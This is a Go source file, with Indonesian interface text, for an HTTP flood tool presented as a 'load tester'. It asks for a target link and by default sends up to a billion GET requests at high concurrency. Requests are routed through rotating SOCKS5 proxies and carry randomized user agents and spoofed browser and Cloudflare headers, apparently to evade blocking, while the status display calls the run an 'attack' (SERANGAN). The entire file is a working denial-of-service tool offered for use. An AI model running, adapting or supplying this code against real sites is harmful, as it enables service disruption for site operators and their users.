package main
 
import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"golang.org/x/net/http2"
	"github.com/corpix/uarand"
)

const (
	RESET  = "\033[1;0m"	 
	HIJAU  = "\033[1;92m"	 
	MERAH  = "\033[1;91m"	 
	KUNING = "\033[1;93m"	 
	UNGU   = "\033[1;95m"	 
	CYAN   = "\033[1;96m"	 
)
func Putih(text string) string  { return "\033[1;97m" + text + RESET }
func Hijau(text string) string  { return HIJAU + text + RESET }
func Merah(text string) string  { return MERAH + text + RESET }
func Kuning(text string) string { return KUNING + text + RESET }
func Ungu(text string) string   { return UNGU + text + RESET }
func Cyan(text string) string   { return CYAN + text + RESET }

type LoadTester struct {
	Link             string	 
	numRequests      int64	 
	concurrency      int	 
	timeout          time.Duration	 
	method           string	 
	headers          map[string]string	 
	proxies          []string	 
	successCount     int64	 
	failureCount     int64	 
	sentCount        int64	 
	totalLatency     int64	 
	lastResponseCode string	 
	client           *http.Client	 
}
 
func NewLoadTester(  
	Link string, 	 
	numRequests int64, 	
	concurrency int,   
	timeout time.Duration, 	  
	method string, 	 
	headers map[string]string, 	 
	proxies []string, 
	 
) *LoadTester {   
	var proxyFunc func(*http.Request) (*url.URL, error) 	 	 
	if len(proxies) > 0 { 	 	
		proxyFunc = func(req *http.Request) (*url.URL, error) { 				
			proxyStr := proxies[rand.Intn(len(proxies))]						
			return url.Parse(proxyStr)						
		}		
	}
	 
	transport := &http.Transport{
		Proxy:               proxyFunc,
		MaxIdleConns:        50000,
		MaxIdleConnsPerHost: 50000,
		IdleConnTimeout:     3 * time.Second,
		TLSHandshakeTimeout: 3 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 3 * time.Second,		
			DualStack: true,	
		}).DialContext,	
	}
	
	if err := http2.ConfigureTransport(transport); err != nil {
		log.Fatalf("Gagal mengonfigurasi HTTP/2: %v", err)	
	}
	client := &http.Client{	
		Transport: transport,	
		Timeout:   timeout,
	}
	
	return &LoadTester{
		Link:         Link,	
		numRequests:  numRequests,	
		concurrency:  concurrency,
		timeout:      timeout,	
		method:       method,
		headers:      headers,
		proxies:      proxies,
		client:       client,		
	}
}

func (lt *LoadTester) sendRequest(ctx context.Context) {
	startCycle := time.Now()
	req, err := http.NewRequestWithContext(ctx, lt.method, lt.Link, nil)
	if err != nil {
		atomic.AddInt64(&lt.failureCount, 1)		
		lt.lastResponseCode = "ERROR"				
		return		
	}	
	req.Header.Set("User-Agent", uarand.GetRandom())	
	for k, v := range lt.headers {		
		if strings.ToLower(k) == "user-agent" {				
			continue						
		}				
		req.Header.Set(k, v)				
	}	
	
	resp, err := lt.client.Do(req)		
	lat := time.Since(startCycle)		
	atomic.AddInt64(&lt.totalLatency, lat.Nanoseconds())		
	if err != nil {		
		atomic.AddInt64(&lt.failureCount, 1)				
		lt.lastResponseCode = "ERROR"				
		return				
	}
		
	defer resp.Body.Close()		
	lt.lastResponseCode = fmt.Sprintf("%d", resp.StatusCode)		
	if resp.StatusCode == 200 {		
		atomic.AddInt64(&lt.successCount, 1)				
	} else {
		atomic.AddInt64(&lt.failureCount, 1)				
	}		
}

func (lt *LoadTester) run(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	sem := make(chan struct{}, lt.concurrency)
	var inner sync.WaitGroup
	for i := int64(0); i < lt.numRequests; i++ {
		select {
		case <-ctx.Done():
			break
		default:
		}
		sem <- struct{}{}
		inner.Add(1)
		atomic.AddInt64(&lt.sentCount, 1)
		go func() {
			defer func() { <-sem; inner.Done() }()
			lt.sendRequest(ctx)
		}()
	}
	inner.Wait()
}

func printLogo() {
	logo := "" +
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣄⡀\n" +
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀\n" +
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧\n" +
		"              ──────┘                    ──────┘\n"
	fmt.Println(logo)
}

func animate(ctx context.Context, lt *LoadTester, currentCycleDuration time.Duration, summaryDuration time.Duration, interval time.Duration) {
	syms := []string{"▁", "▃", "▄", "▅", "▇"}
	idx := 0
	startCycle := time.Now()
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			elapsed := time.Since(startCycle)
			done := atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount)
			pending := atomic.LoadInt64(&lt.sentCount) - done
			avgLatency := int64(0)
			if done > 0 {
				avgLatency = atomic.LoadInt64(&lt.totalLatency) / done / 1e6
			}
			if elapsed >= currentCycleDuration {
				total := done
				summary := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
				        Putih("\n "),
 					   Cyan("["),
					    Putih("BERHASIL"),
					    Cyan("]"),
  					  Hijau(":"),
                        Cyan("["),
                        Putih(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
                        Putih("DETIK"),
                        Cyan("]"),
   					 Hijau(":"),
                        Cyan("["),
  					  Hijau(fmt.Sprintf("%d", total)),
                        Putih("REQUESTS"),
                        Cyan("]"),
		    	)
				fmt.Println(summary)
				time.Sleep(summaryDuration)
				fmt.Print("\033[2A\033[J")
				currentCycleDuration += 60 * time.Second
				startCycle = time.Now()
			} else {
				remaining := currentCycleDuration - elapsed
				timerStr := fmt.Sprintf("%02d:%02d", int(remaining.Minutes()), int(remaining.Seconds())%60)
				line := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
			    	Cyan(syms[idx%len(syms)]),
			    	Merah("["),
					Putih("SERANGAN"),
					Merah("]"),
					Kuning(":"),
					Merah("["),
                    Hijau(timerStr),
					Merah("]"),
					Putih("RPS"),
					Kuning(":"),
					Hijau(fmt.Sprintf("%d", pending)),
					Putih("AVG"),
					Kuning(":"),
                    Hijau(fmt.Sprintf("%d", avgLatency)),
				)
				idx++
				fmt.Print("\r" + line)
			}
		}
	}
}

func loadProxiesFromFile(path string) []string {
	var proxies []string
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Gagal membuka file proxy.txt: %v", err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			if !strings.Contains(line, "://") {
				line = "socks5://" + line
			}
			proxies = append(proxies, line)
		}
	}
	if err := scanner.Err(); err != nil {
		log.Fatalf("Gagal membaca file proxy.txt: %v", err)
	}
	rand.Shuffle(len(proxies), func(i, j int) { proxies[i], proxies[j] = proxies[j], proxies[i] })
	return proxies
}

func fetchProxies(urls []string) []string {
	var out []string
	client := &http.Client{Timeout: 3 * time.Second}
	for _, src := range urls {
		resp, err := client.Get(src)
		if err != nil {
			continue
		}
		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			if !strings.Contains(line, "://") {
				line = "socks5://" + line
			}
			out = append(out, line)
		}
		resp.Body.Close()
	}
	rand.Shuffle(len(out), func(i, j int) { out[i], out[j] = out[j], out[i] })
	return out
}

func main() {
	rand.Seed(time.Now().UnixNano())

	configPath := flag.String("config", "", "FILE JSON")
	requestsFlag := flag.Int64("requests", 1000000000, "Total requests")
	concurrencyFlag := flag.Int("concurrency", 550, "Concurrency")
	timeoutFlag := flag.Float64("timeout", 2, "Timeout per request (detik)")

	noLive := flag.Bool("no-live", false, "Matikan live output")
	flag.Parse()

	var cfg map[string]interface{}
	if *configPath != "" {
		b, _ := ioutil.ReadFile(*configPath)
		json.Unmarshal(b, &cfg)
	}

	var proxies []string
	proxies = loadProxiesFromFile("proxy.txt")

reader := bufio.NewReader(os.Stdin)
fmt.Print("+--[ LINK ] : ")
link, _ := reader.ReadString('\n')
link = strings.TrimSpace(link)

if link == "" {
    fmt.Println(Merah("LINK TIDAK BOLEH KOSONG"))
    os.Exit(1)
}

	numReq := *requestsFlag
	if v, ok := cfg["requests"].(float64); ok {
		numReq = int64(v)
	}
	conc := *concurrencyFlag
	if v, ok := cfg["concurrency"].(float64); ok {
		conc = int(v)
	}
	timeout := time.Duration(*timeoutFlag * float64(time.Second))

	headers := map[string]string{
		"Accept":                    "application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.9",
		"Accept-Encoding":           "gzip, deflate, br",
		"x-forwarded-proto":         "https",
		"x-requested-with":          "XMLHttpRequest",
		"cache-control":             "no-cache",
		"sec-ch-ua":                 "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
		"sec-ch-ua-mobile":          "?0",
		"sec-ch-ua-platform":        "Windows",
		"accept-language":           "en-US,en;q=0.9, fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5, en-US,en;q=0.5",
		"upgrade-insecure-requests": "1",
		"Connection":                "Keep-Alive",
		"Max-Forwards":              "10",
		"CF-RAY":                    "randomRayValue",
		"referer":                   "https://google.com",
		"sec-fetch-mode":            "navigate, cors",
		"sec-fetch-dest":            "empty",
		"sec-fetch-site":            "same-origin",
		"Access-Control-Request-Method": "GET",
		"data-return": "false",
		"dnt": "1",
		"A-IM": "Feed",
		"Delta-Base": "12340001",
		"te": "trailers",
		"method": "GET",
		"pragma": "no-cache",
		"sec-fetch-user": "?1",
		"Accept-Language":          "en-US,en;q=0.9,id;q=0.8",
		"CF-IPCountry":             "US",
		"Via":                      "1.1 google",
		"Origin":                   "https://www.google.com",
		"Access-Control-Allow-Origin": "*",
		"Device-Memory":            "8",
		"Downlink":                 "10",
		"ECT":                      "4g",
		"RTT":                      "50",
		"Save-Data":                "on",
		"Viewport-Width":           "1920",
		"Width":                    "1920",
		"X-ATT-DeviceId":           "GT-N7100",
		"X-Wap-Profile":            "http://wap.samsungmobile.com/uaprof/GT-N7100.xml",
		"X-UIDH":                   "1234567890abcdef",
		"X-Csrf-Token":             "null",
		"X-Api-Version":            "1",
		"X-Client-Data":            "CI22yQEIo7bJAQjEtskBCKmdygEIqKPKAQ==",
	}

	fmt.Print("\033[H\033[2J")
    printLogo()

	lt := NewLoadTester(link, numReq, conc, timeout, "GET", headers, proxies)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigc
		fmt.Printf("\n%sTERIMA SIG. STOP%s\n", Merah(""), RESET)
		cancel()
	}()

	var wg sync.WaitGroup
	if !*noLive {
		wg.Add(1)
		go func() { defer wg.Done(); animate(ctx, lt, 60*time.Second, 2*time.Second, 100*time.Millisecond) }()
	}

	wg.Add(1)
	go lt.run(ctx, &wg)

	wg.Wait()
	cancel()
	fmt.Println("\n" + Hijau(">> SUKSES <<"))
}
